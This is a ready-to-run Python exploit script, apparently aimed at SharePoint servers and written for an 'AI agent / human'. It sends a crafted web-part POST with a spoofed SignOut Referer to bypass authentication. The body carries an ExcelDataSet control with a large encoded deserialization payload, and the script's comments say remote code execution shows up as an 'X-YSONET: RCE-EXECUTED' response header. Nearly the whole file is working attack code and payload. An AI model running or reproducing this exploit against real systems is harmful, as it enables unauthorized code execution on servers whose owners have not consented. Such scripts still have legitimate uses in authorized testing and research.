# -*- coding: utf-8 -*-
# Usage (for AI agent / human):
#   python3 exploit.py --url http://10.10.10.166
# ## Success:
#   - RCE success can be confirmed by finding the header `X-YSONET: RCE-EXECUTED` in the response when the ExcelDataSet type is used.
#   - When testing deserialization, a `401 UNAUTHORIZED` or redirect means the deserialization payload failed; it can appear even if auth was bypassed.

import argparse
from urllib.parse import urlparse, quote

import requests


def main():
    parser = argparse.ArgumentParser(description="Send crafted SharePoint POST request.")
    parser.add_argument(
        "--url",
        required=True,
        help="Base URL of the target, e.g. http://10.10.10.166",
    )
    args = parser.parse_args()

    # Normalise base URL (no trailing slash)
    base_url = args.url.rstrip("/")

    # Build full target URL from the original POST line
    # POST /_layouts/15/webpartpage.aspx?DisplayMode=Edit&foo=/webpartpage.aspx HTTP/1.1
    target_url = f"{base_url}/_layouts/15/webpartpage.aspx?DisplayMode=Edit&foo=/webpartpage.aspx"

    # Derive Host header from the URL
    parsed = urlparse(base_url)
    host_header = parsed.netloc or "sharepoint"

    headers = {
        "Host": host_header,
        "User-Agent": (
            "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) "
            "AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"
        ),
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8"
        ),
        # Let requests calculate Content-Length automatically
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        # Keep referer exactly as in the original request (relative path)
        "Referer": "/_layouts/SignOut.aspx",
    }

    # Body copied exactly from your raw HTTP request (after the blank line).
    body_template = """MSOTlPn_DWP=<%25@ Register Tagprefix="ScorecardClient" Namespace="Microsoft.PerformancePoint.Scorecards " Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %25>

<asp:UpdateProgress ID="Update" DisplayAfter="1"
runat="server">
<ProgressTemplate>
  <div>
    <ScorecardClient:ExcelDataSet CompressedDataTable="H4sIAAAAAAAEAO1d624bxxV22iZAnPpXX4Dlb4vk8iaJERU4dhIY8Q22mxgwDGRFjmTa5K66u7RIBHmJvlvfpf/a5UWyzPlcfx6eXS6l4wCx/Gl25syZc5vbmRtf3Lhx47/pn9nfsz9//VP6v0fPpnFiRpV7fuLfLv1iongQBt1mpTb773bp7niYjCPTDcw4ifzh7dKT8dFw0PvZTJ%2BHb03QPdrd9Vu9VtvbbzRNbW//y1nlf7tU5/x/z0wya%2BvrF6Phs95rM/K/SX%2B6Nzg%2B/inyR198MfvdV39O//fvrw%2B%2Bm4yGpXdLMspepVYumaAX9gfBSbc8To53vHb5u8NbNw8mcSee13XrZin9M%2Bh3y/24vPhHWkcQd8uX/9WZpMDrJDntVKtnZ2eVs0YljE6q9VrNq754%2BGBB1gcfjOJ%2BSnraaBQsW4p3RoNeFMbhcbLTC0edtNzOolT5cPbljCYzNCMTJKXAH5k5RaVFic79eMmJbjmJxuYC/0ds7o6jKP3mQdjzh2b568MFKbMq06ZOh2byfHpqlugSfx0OeqY0GgSPe71xlPYvZdbIn5z/axwcheOgb/rli88QjcnR8HKBj7f5/rex%2Bec4HZXVX31Q%2B%2BqvZn8WDYZHb84i//TURGVUaMmXGbdmzXfLS2m6Gw6HppekchFXfjKBiQa9yoNBnPzmvXx5WeCemehdype4cj9ITBT4w8oPk1N/xodfF63%2BVr/44NdB0A/P4spDP3o7Pq288EfDp8bvmygV9MjEaTf8WYM/pmJqzsLorYOGNLyj48Zeq%2B33G%2B2mabRe3V5tfE7146M3aedmPz6JwneDbEl4dbuEOCag/69ewTFN5gOZCocfTGeD%2Bv8GPvGjE5M8Srsbn/o9c6HGK4U/kPrqqpBWPyal899g6Z7/aim97xWteqFp5yqJalj5dtH%2B3Gik//rqL6lt%2B9d/vjzopybvJOos/vJHztbm8oeLyj714XmTO%2B%2B8pa3qx%2Bf9SQ1AaUnZzIqm//QurFMUnj2OUmGccfk9T95r8GXWntvZPm1oP/xu8OnvdgZBnPjpmH5g0lb0%2B/Hxez221cqtuc/qXGlVGs8J/GEhIDNpXSmRUjcj1PTTH9IuJNOaZVvTUove3F8SVUr70Flo1vsOl1dVYf7hQ5O8DvsznTp84kexOaheQj5aPi2a/j41ojEqs1TlS1Sk3OnESZS66vLhwd9f3r135/mdlwdPTRyOo565N5gbbz%2Ba3rq5dNBLTi7FtnIhtpVUbKtng%2BB4MmNtuzpJu1c9vWQNy8sqOpPPq%2BTiu7Tx3jDaCc6tTGdhD7/149iMjobT7ijuhdFwcHTxRYS/qDw1x0u3BD8%2BVzIkiJ3UjHbLfjx6EPr9cmlRZOHzfp905syNOneWlf5RLr0fs255/sllJbAbqHxiFA8mnTtR5E9LiybjzvfTxJRXCy3gw93dg%2Bryx3Nov2ZBXrNpYXapBlGGQZi2GKTealEYU5e3J0WVFNIuGkGKXE/Eq%2B9J1WSLdMMDqthmvkQ6bGP7toWo2RaiYZs2ZBBsWndtUsn6UfU1hNm1eR5ooQ6KIQw04YExqAGOgG/3bffi1WyeA%2Br27VKoMg8MM8RAHzx7cBAhtnR7Nbs2yGDETK4TqDo41NSnbbsPuzZ/9%2BwxhWTYX2IRAcMAGNcE2gyEC0Cg63Zdm7WNwOK0bfYxNQFLAoSQIcmuqGmLR5OTv6L5onqdcQR235CBByLNFOJcplB/NyvvQHWB3LjVDSzPFsTJwKVk2DW3eoo2bygaPVlGuFIj76hTburiAesopgxin20nRVvQfIbeGvSs6eZRQewqRaWjA/FA0L1Z9b8%2ByL6jnuv4KKLINiKOMbVUXFc0xO6XI4N2r6pJRMtOIBxBK1ZeHbgOsSCthVZeNqslGXrKqypeuY4PCHegeKPlaLSmDNbx3RYtgeBkGBWLrfRI1UPtSl0fxHF8wGesdCPjXQP7OWAZ11HiM5xCOE5qsrO53lWNnvIV76u6upMdgpaNNhtIiIXJTD3MNlwdGCLHZVxbrN303m1hTxFFFNlGpG6fdAEHDRib1AS78zmaIHBkxzauTfs7x10z0H/GKDvWjWJfxyOyZHvMuTmqPXh%2BDUB2dxy3BwBkk4CmF6DL1IlqttPg4KFUD8HJMYoAxxiBIaCODuuAGdzGKXBct%2BNI4OTA9YCSJBfcYmOKBGAZwUlBV%2BW2ayKPPmZqnYE9c63d7g5Y%2BuOIkjOpeXfZrpvsspiNJVez2o7mhHQZjss57v3ZczQMbH/EHADXH7e4pqi98VrAz29Lf8DMI2eiAAm2nQHeC2wtuk4awM6O3T1OGMC%2BFKO7BZUFtOW1eYXbtSF3HgM3nu0Q1sXiTMQt0J5YULntYwHuuMpFwIjzYsFtHc1h7GIgSLVJsKWGC%2BLqYpFlHZhu1MMGIIyxy9c0SAQNbrHrIY1btpMpsS4j8eZKOXNGbM6F1JXaRGzbFgPczWOoktozdJxHATa1xI4YNMTuhLt9VnzEcfkA8Vrq7kO9JdU54OQcueQYbWSmbGLDBhybWwzdAPMZp4qkeiaFgJMx4JoPiNXBh9TSRZ7aLyaPQI7AEWJ0VRcsp9ulWuDGPmgRlAIrrdlJGBPGo6N/joYS5TYQU17H8A%2BMutwCq1tNoHdAg%2BG5e3ick0uAgZOTZJe8wEMnVN1qAmc85ThPDQZiJ1ggcWSUVHgBYnCwBQ1K2R0GB9JdTbqUS/XAwrAYo5BzZM9EF%2B3Ar6N9Y4QHreYQdUvFvVxw3gCL24wfcl09ldIUsQx/UgRJ0SM2pytYx6Tqye6WPvJbOXaMms8QZaj0Bw1Gf5jWQC4oEFdKtYamKo7NcWNLuXa00e3aINjYcW6QSmQFHAAoRfGdS6GI0tc5NkiJDNAHgKAskW7tgQAxy/bq6Cabm75TEgq2acE%2BiZxGAGV2bY9hJ8itBzbgxOxZjZknU82J%2BbyCtSUWf1DKJBVdUItJQmVAhkixW/qAIiCNYEMfrPBlGF9RS%2BocSZTTZIZXjgPMjFCuNWovCCVCBnxiiKLaQymPHasCq8pZspNqrk6FrNSOKNUelZlUrjmgL2C1X2zwUP6TDJvbZbbh5JpD2aTdmuOCNG7wqHkZ1R5QBXC/jDEHIBJHloxpjzoTxfVvX6x/VHvoGrfjPSNqZQHlT3a1LVR76AKPW3t7VHstZn5HZXKg%2BoeOMNnNUT6NaQ4cYAJnrxjpBLn2Hf0s1bs9phA4eQWuX1JRKRWQAIlyzM3lyAIgKmKaDhyRY%2BfAEgalCGhY5NqjAinwlAEYGGrdFrjeou2WFR/xKItCCUnBeibGIcrJ5UjQlWU0ZUAyPNF0jVhNlMl1FdUNAb4ZvK5HP5WDdlrQOQ2Q465NbUPVwNYDOPUAjh3Ah6jIpKiwXA1c2ETHVNCniCVicSl%2B7AjcGCevjMNTbagHoAlqEgSmN2DPB6f9JLPfUkETeF4KPqTFtQnZS4Vl4F4YVxc7fIUZA9BVcDGEfX8MUwIoRgrCvfLVZo0jGjDyeTTSYKKBRcNIfooOOkCV5njHnV3dEDvho3yk7EAVAwqFqOMyuyLqgAPKoRMwDRVpAdY4H42MLjQBnOHhBmdDNkZYA9YQCujqWPNECgVwKVdBngoelhba3aMZg%2BMpbpDQlhclsG5JqiZtJSRfZYD3RaAfBtEksOqorwhDgQOZxJzkU%2BbjyrpmKPxsBjvOmbLmRXSst67/xbFW4HAudDjIqKH7XYhL63SMnORTG0mINi4j1RpTBISRt%2B9g6IMItj9FB2jhHT1O%2Bt1ln9TgXUSb%2B0wSHCch30An7Zds72HEiHwQGlX3ftF%2BnlIvYZ7Q001SckifTq5LraPB3I4rq/zgU7DqR88OoDvkvlWRKK5IgGV2OvJ1XoKVHn7OuaIW4CriGi8VAQxxGM5mSQETnc0LuytWDkFX3buFjoiijOfIH7IZC9jolTqwUphwk5t/yAagRZ7zgOAYuExnrq2jC6ADpNeDtXH2h7TmwnP2IrvLwkRQ6GD1GqtuRZElWToQk4BVhTEQJ0rXWxs2EjwCPw7FgfMWaH2BJI0O7DhKNhOdCS/yk98ixYQunzMHlJDwKauc91o3kzsLeCkuwRYMnNljbeDhIc4aILVhDz2QG63AUiFN4uwj2pLZhGvc1JYfiqZJe7vOIQBO5tZYllnntMhmNimzHx1ukng1JFHUSFA2mNxSW283ktqigwdgOO0CbNtMt0ifzIWehXHdonMRMkKlV5VIvRc1rKDv4OYWSkTUZI4HUe/IUxk/uMU/tLrMTUGomRt3RJ6bpDjygboNzHGU0nBqBCXZTtEOnnfKslDuIyPHTnYTmZsxMwZEVG/EJEb15jroDSfrVCpbLhcNp4LcFEewi1QwpHqjerNkFCdUnLBTnsRGqBOH7o6EUUEutwLHBuopS64uG4GLubkTz91BpKIByiRzN1vJ8IPzFG5TKHDxuU1N9cUKUWpPvZzFHiyXdJdykkzxAayQOdNObmLK0U7xXdAYkXERx1JuoDlVlYvEOMZzWRbzVh6O9nyNkce9s5JrTUhJwLoXeE8CLHk6B6ikaIuFjKyWCGov59kFWxSdKcpxnpqRsSG2nDnnNke5mEoyAqX8KMV56sInt83NtScYCZFzGyr1KjeEnGRx0wNBs%2BX6OkOmIUDuMQerYZzvkZtHOO68Oc5IqIyEcs2B59adh4/TG7lJEkcWZftkQwcxnnLWnbQfXA85%2By65okYl5KVMQ97xcx1cDMh3KVULaSEtpIW0kBbSQlroswoVceUSnMQDu4EFJLyIe%2BjU1JVa8aX2AwQnwdQJgQIebchSEcDkc496rIW6u%2B14VdkuRF16BreHXOWJmvxaCMijTwkdtZvKPfrCDAvHAjFmUr0DGTNcrQpFE7UGYksYuBeTr33ibv%2BLWTrRI%2BTkOTy5XWLBM3bX4jwA10Wxc5I520ZS4KklVO4pPW7DiluOFbx%2BkXPwneECKoMAAaoDNwkWg%2BvgZUl0Tw28Q4oWoNHbHg3whhfYm6yDpyLBJosH9ABs/YDX6qgjh6DrMFMO4BpIBIv4bUFgBOCLg%2BBZe5syzgDYvGEqApE1wT/A0V0wXnZXwAVdrw7kC8g%2B0EegfS2bNLcHddDLBuDxFsfBAm/SZTiAQKnF6ga3kJ2kFbEE3KYEpYBNFBsVYCJd9ZMZA2qyxlRt8wQQSQ04MFqO0kQxHHg4qi%2BUGoDmgIiB1GUEwqk0Yicl0qR6UKMF6gLPuzHvNzO%2BNrsIqcGoi1sZMGNHHt3%2BjsuWAzNFgQdsuXyMaAK0fRfWYR62dVJgcUnMGWkArw1nJ9W56otYzyh7r8imEKCrV0So80TWSS8E0nexqWNAgrA1Mvdxi2U5vAaJkhCBSVDWz2NKIfUWCFSZ5QkuVGZmVYoooogiiiiiiCKKKKKIIooooogiiiiiiCKKKKKIIooooogiiiiiiCKKUOdHpY5igAshFI0g%2B1LR%2BFi4MRNqq%2BnGeh2ybIaDQcAbe24VgZvl4EYaRRK4Q1awEXLkNdMxcDfOcUCo572Za5zgYKdjc4LX6h3fpwWFxJJQUHziaGKaA09KO/ZOzHCB1CDgqgi6Htty9PYFU/FtRMBF1M0S5CYKIIIsWL%2BKhlDpUqS0kPIPZG5u6hlrivDck5dQ5l/0nTQqx4QU0qBeQpKKcLhkxoJ5/alhITMeyz3hVNDXY/JEUIIFcKsGvSiencXjVJ17PETyFRXOuFBxqhrZz1Abqj1gQbMTUWrBpoiFqFkylRLfcc0KVMSoqFuumq1RPMm3wCg3SiZdk7Seku%2BTbKtLFrvPTmmfW1bHrVEaamYk%2BUIGG6Fuq3RyboaaqWxrTQzS5uIRKeUTjMkk31cjNYahi0zUSK3tCj7wy%2BV6FQtga9TgUIlXW1yD1AgKvuTMZo1lhod8aZtrkPNJeW62NplCYkGx5LOL1MaYnMJLPr3MhajkY2eSOaC5nLGcQZY6ZiIWynJzHzF3mvvEhxw9uSUoSXdazMhflA/q5ukG1c0LI9RynNQ0fo8bYsGXLslnfhlBIBesqLM7um7AI1s7k893TaBFCZ6QIrflnp4XfWaWe0ZczgoLvrmuNkFtgrRNUEQRRRRRRBFFFFFEEUUUUUQRRRRRRBFFFFFEEUUUyQ5xPKtFnYdjELClAl5ULhrXFFFEEUUUUUQRRRRRRBFFFFFEEUUUUUQRRRRRRBFFFFFEEUUUUUQRRRRRJG/k1s3SpT8H1UnnThT500v4QfXx0RvTS%2B75if8kCt8N%2BiaqPDTJ67D/xI/8kUlMFC/Lo7Lnv7J/U5p0fjbTbjmZnpq4XFoUuB/EiR/0TLf8%2B7PETwa9pyYOx1HPlPx49CD0%2B3%2BUS4vWH6Vtd8s/meT5/PvLJBMUV9ci%2BXgQxfN2P032vHc20b/4w7H5XKJXhyvu3A%2BSRn0xnosf8xy4XmT8xJx3/dOsuODaCjvuB%2B/Ct%2BahGR2ZaF2WTDqPxsNhdRWOOt8Pgv4gOPlx6J/Eh63ZUbUVjKsoX1hgDA%2Bq5/y/N%2BglgzDwo%2Bnhq1eHB1U/mM4GY4WKRVWfYnM1bWHWmOmnP5yaKJnWPiD7h8mpH/RN/9fIP01//fj4hT8aPjV%2BStNHJW32XXj05mzxyUWvkqPh/OeDaj%2Be96c/OD4%2BiTqLv/xRin3zP3Z/f7WVgQEA" DataTable-CaseSensitive="false" runat="server"/>
  </div>
</ProgressTemplate>
</asp:UpdateProgress>&MSOTlPn_Uri=http%3A%2F%2Fsharepoint%2F_controltemplates/15/AclEditor.ascx"""

    # Replace URL-encoded "http://sharepoint" with URL-encoded user-supplied base URL
    encoded_base_url = quote(base_url, safe="")  # e.g. "http%3A%2F%2F10.10.10.166"
    body = body_template.replace("http%3A%2F%2Fsharepoint", encoded_base_url)

    # Encode body as UTF-8 bytes (robust for any non-ASCII chars)
    body_bytes = body.encode("utf-8")

    # Send the request
    response = requests.post(target_url, headers=headers, data=body_bytes)

    print("[*] Sent request to:", target_url)
    print("[*] Status:", response.status_code)
    print("[*] First 500 bytes of response body:")
    print(response.text[:500])


if __name__ == "__main__":
    main()
